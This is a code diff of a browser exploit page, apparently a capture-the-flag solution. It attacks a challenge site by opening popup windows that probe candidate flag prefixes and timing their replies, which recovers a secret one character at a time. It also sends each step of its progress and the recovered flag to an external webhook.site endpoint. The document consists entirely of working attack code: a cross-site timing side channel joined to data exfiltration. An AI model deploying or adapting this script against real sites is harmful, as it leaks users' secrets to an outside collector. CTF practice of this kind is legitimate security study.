@@ -5,12 +5,8 @@
 <script>
 const TARGET = "https://svfgp.breakable.live/";
 const WEBHOOK = "https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
-
-let prefix = "CTF{1390999.";
-
-const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"\'*.-?~';
-const ROUND_TIMEOUT = 9000;
-
+let prefix = "CTF{";
+const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
 let running = false;
 
 function exfil(msg) {
@@ -21,102 +17,81 @@ function exfil(msg) {
   }).catch(() => {});
 }
 
-function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
-}
-
-function makeProbeUrl(cand) {
-  return TARGET +
-    "?mode=probe&q=" + encodeURIComponent(cand) +
-    "&sid=" + encodeURIComponent(cand) +
-    "&rid=" + Math.random().toString(16).slice(2);
-}
-
-async function runBatch(candidates, timeoutMs) {
-  return new Promise((resolve) => {
-    const started = new Map();
-    const finished = [];
-    const wins = [];
-    let done = false;
-
-    function cleanup() {
-      window.removeEventListener("message", onMsg);
-      for (const w of wins) {
-        try { if (w) w.close(); } catch (_) {}
-      }
-    }
-
-    function finish() {
-      if (done) return;
-      done = true;
-      cleanup();
-      finished.sort((a, b) => b.dt - a.dt);
-      resolve(finished);
-    }
-
-    function onMsg(ev) {
-      const d = ev.data || {};
-      if (d.type !== "svfgp-probe-done") return;
-      if (typeof d.sid !== "string") return;
-      if (!started.has(d.sid)) return;
-
-      finished.push({
-        sid: d.sid,
-        dt: performance.now() - started.get(d.sid)
-      });
-
-      if (finished.length === candidates.length) finish();
-    }
-
-    window.addEventListener("message", onMsg);
-
-    for (const cand of candidates) {
-      started.set(cand, performance.now());
-      const w = window.open(makeProbeUrl(cand), "_blank", "width=220,height=120");
-      wins.push(w);
-    }
-
-    setTimeout(finish, timeoutMs);
-  });
-}
-
-async function main() {
+function round() {
   if (running) return;
   running = true;
 
-  exfil("start:" + prefix);
+  const started = new Map();
+  const finished = [];
+  const wins = [];
 
-  try {
-    while (!prefix.endsWith("}")) {
-      const candidates = [...CHARSET].map(ch => prefix + ch);
-      const res = await runBatch(candidates, ROUND_TIMEOUT);
-
-      if (!res.length) {
-        exfil("no-results-for:" + prefix);
-        break;
-      }
-
-      exfil("scan:" + res.slice(0, 5).map(x => x.sid + ":" + Math.round(x.dt)).join("|"));
-      prefix = res[0].sid;
-      exfil("progress:" + prefix);
-
-      await sleep(300);
+  function cleanup() {
+    window.removeEventListener("message", onMsg);
+    for (const w of wins) {
+      try { if (w) w.close(); } catch (_) {}
     }
+    running = false;
+  }
+
+  function chooseBest() {
+    if (!finished.length) {
+      exfil("no-results");
+      cleanup();
+      return;
+    }
+
+    finished.sort((a, b) => b.dt - a.dt);
+    const best = finished[0];
+    prefix = best.sid;
+    exfil("progress:" + prefix);
+
+    cleanup();
 
     if (prefix.endsWith("}")) {
       exfil("FLAG:" + prefix);
       document.body.textContent = "DONE: " + prefix;
-    } else {
-      exfil("stopped:" + prefix);
-      document.body.textContent = "STOPPED AT: " + prefix;
+      return;
     }
-  } catch (e) {
-    exfil("error:" + String(e));
-    document.body.textContent = "ERROR";
+
+    setTimeout(round, 300);
   }
 
-  running = false;
+  function onMsg(ev) {
+    const d = ev.data || {};
+    if (d.type !== "svfgp-probe-done") return;
+    if (typeof d.sid !== "string") return;
+    if (!started.has(d.sid)) return;
+
+    finished.push({
+      sid: d.sid,
+      dt: performance.now() - started.get(d.sid)
+    });
+
+    if (finished.length === CHARSET.length) {
+      chooseBest();
+    }
+  }
+
+  window.addEventListener("message", onMsg);
+
+  for (const ch of CHARSET) {
+    const cand = prefix + ch;
+    const url =
+      TARGET +
+      "?mode=probe&q=" + encodeURIComponent(cand) +
+      "&sid=" + encodeURIComponent(cand) +
+      "&rid=" + Math.random().toString(16).slice(2);
+
+    started.set(cand, performance.now());
+    const w = window.open(url, "_blank", "width=220,height=120");
+    wins.push(w);
+  }
+
+  setTimeout(() => {
+    chooseBest();
+  }, 12000);
 }
 
-main();
+exfil("start");
+round();
 </script>
